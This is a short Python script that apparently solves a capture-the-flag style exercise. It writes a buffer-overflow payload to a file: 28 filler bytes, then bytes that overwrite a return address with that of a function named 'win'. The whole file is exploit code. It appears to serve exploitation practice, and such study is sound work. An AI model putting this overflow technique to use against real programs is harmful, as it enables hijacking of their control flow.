#!/usr/bin/env python3

from struct import pack

payload = b'a' * 28

# The address of the function win
payload += pack("<B", 55)
payload += pack("<H", 0x21a6)

with open("payload", "wb") as f:
    f.write(payload)